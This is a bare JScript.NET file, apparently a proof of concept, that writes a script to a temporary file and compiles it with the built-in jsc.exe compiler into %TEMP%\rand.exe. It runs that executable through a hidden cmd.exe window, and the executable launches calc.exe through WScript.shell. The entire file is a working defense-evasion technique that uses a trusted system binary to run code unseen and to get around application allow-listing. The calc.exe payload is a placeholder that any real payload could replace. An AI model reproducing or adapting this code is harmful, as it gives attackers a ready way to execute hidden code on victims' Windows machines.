import System;
import System.Diagnostics;
import System.IO;
import System.IO.Path;
import System.Threading;
var script = "import System; import System.Diagnostics; var shell = new ActiveXObject('WScript.shell').Exec('calc.exe');"
var tmp = Path.GetTempFileName();
var tmpPath= Path.GetTempPath();
var streamWriter = File.AppendText(tmp);
streamWriter.WriteLine(script);
streamWriter.Flush();
streamWriter.Close();
var process = new System.Diagnostics.Process();
var startInfo = new System.Diagnostics.ProcessStartInfo();
startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
startInfo.FileName = "cmd.exe";
startInfo.Arguments = "/c C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\jsc.exe /out:"+ "\"%TEMP%"+"\\rand.exe\" "+tmp+" & cd "+tmpPath+" & rand.exe"
process.StartInfo = startInfo;
process.Start();
System.Threading.Thread.Sleep(200000);

